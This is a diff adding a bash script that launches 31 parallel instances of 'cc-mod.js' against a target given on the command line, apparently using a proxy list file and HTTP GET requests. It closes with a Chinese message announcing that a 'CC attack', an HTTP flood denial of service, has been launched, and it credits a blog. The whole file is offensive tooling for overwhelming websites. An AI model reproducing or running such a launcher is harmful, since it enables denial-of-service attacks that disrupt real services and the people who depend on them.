@@ -1,0 +1,33 @@
+#!/bin/bash
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+node cc-mod.js $1 cc.txt $2 GET &
+echo  'cc攻击发动成功,零零博客www.00bk.cn'
